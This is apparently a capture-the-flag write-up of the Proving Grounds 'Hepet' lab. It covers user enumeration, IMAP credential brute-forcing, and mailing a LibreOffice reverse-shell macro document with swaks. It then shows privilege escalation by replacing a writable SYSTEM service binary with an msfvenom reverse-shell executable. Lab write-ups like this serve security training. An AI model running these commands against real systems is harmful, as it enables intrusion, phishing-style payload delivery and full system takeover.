---
layout: post
title: "Hepet - Proving Grounds Practice"
summary: "Website Enumeration → Usernames and Password for IMAP → IMAP login → IMAP read emails → LibreOffice Malicious Macro → Libre Office Malicioous Macro Generator (MMG-LO repo) → swaks to send file → User shell → PowerUp.ps1 to find Writeable service binary → msfvenom to generate reverse shell → shutdown /s /t 0 to reboot → Administrator"
---

# Hepet - Proving Grounds Practice

## Enumeration
### Nmap
Initial nmap scan revealed Mail ports and HTTP port 8000 were open. Moreover, FTP and VNC ports were open in non-common ports.

<img width="851" height="795" alt="03 - nmap again" src="https://github.com/user-attachments/assets/33182420-5b5f-4bf3-bbab-660b4ed6d974" />

### Web Enumeration
Visiting the web page revealed some names. But one name had different description than others.

<img width="1261" height="692" alt="04 - what is this" src="https://github.com/user-attachments/assets/06e01933-d8d8-40a0-9d15-8dd097964b55" />

At first, I used `username-anarchy` to create a username list. Then using `smtp-user-enum` tool, I obtained 5 valid users.

<img width="780" height="501" alt="02 - usernames" src="https://github.com/user-attachments/assets/52de4ec5-685b-4b8b-81ae-1a4daa9d70e8" />

Then I brute forced imap, smtp and SMB login. At first I tried NSR brute force. Then I tried to brute force with interesting description value and found IMAP credentials for jonas.

<img width="1484" height="217" alt="05 - imap login" src="https://github.com/user-attachments/assets/976850b4-9f59-49b5-a42a-03d97bc20abe" />

Then following this [https://hackviser.com/tactics/pentesting/services/imap](https://hackviser.com/tactics/pentesting/services/imap) blog, I logged in to IMAP and started reading emails.
```bash
a1 LOGIN username password
a2 LIST "" "*"
a3 SELECT INBOX
a4 FETCH 1 BODY[]
```

<img width="1132" height="692" alt="06 - imap login" src="https://github.com/user-attachments/assets/ecec0956-b6f7-4746-9f0f-8be38d19fdc6" />

One of the email suggested they are using LibreOffice and opening every document attached. So we had to do Malicious Macro Injection for LibreOffice.
Moreover, it revealed target mail `mailadmin@localhost`

<img width="1361" height="594" alt="07 - libre office" src="https://github.com/user-attachments/assets/8345ff7f-b4f4-41b4-bdd2-28a6b88957ac" />

## Exploitation
### Malicious Macro - LibreOffice
I found this repo ([0bfxgh0st/MMG-LO](https://github.com/0bfxgh0st/MMG-LO)), which allows you to create reverse shell macro injected libre files.

So I created a malicious ODS file. Then using swaks I sent it to mailadmin. And started waiting with netcat listener.
```bash
python mmg-ods.py windows LHOST LPORT
swaks -t mailadmin@localhost --from jonas@localhost --attach @MALICIOUS_FILE --server TARGET_IP --body "hi" --header "subject: test"
```

<img width="1152" height="362" alt="08 - malicious libre generate and swaks" src="https://github.com/user-attachments/assets/df3f7d64-52ca-4cb4-8689-359502d80240" />

Later, I obtained the user shell.

<img width="884" height="623" alt="09 - local flag" src="https://github.com/user-attachments/assets/9d964315-245d-4c0d-aa72-607e1f75f865" />

## Privilege Escalation
### Service Abuse (Writeable Service Binary)
I executed `PowerUp.ps1` and found that VeyonService is executed with SYSTEM privileges and I could write onto it.

<img width="1072" height="238" alt="10 - veyon service" src="https://github.com/user-attachments/assets/37704620-dcfa-4641-ab70-44da3df70293" />

So at first, I created a malicious exe file with msfvenom.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.164 LPORT=8080 -f exe  -o exp.exe
```

And then transfered it to target.

<img width="874" height="236" alt="11 - transfer exp" src="https://github.com/user-attachments/assets/c7f17c9c-77f3-44c3-b56f-a6b1990d28eb" />

Then, I overwrote the veyon-service.exe file with my malicious file.

<img width="1115" height="590" alt="12 - 0 transfered" src="https://github.com/user-attachments/assets/b6c789e1-a1e9-40fd-a3e0-c330fe36674f" />

I had no permission to restart the service. So, I rebooted the machine using `shutdown /s /t 0` command.

<img width="433" height="95" alt="12 - reboot" src="https://github.com/user-attachments/assets/e98b885b-682b-4a3f-8341-d8695bc402d1" />

After waiting, I obtained the SYSTEM shell.

<img width="756" height="304" alt="13 - Admin flag" src="https://github.com/user-attachments/assets/3f62d661-ea68-4deb-80c5-359ffd6f3722" />



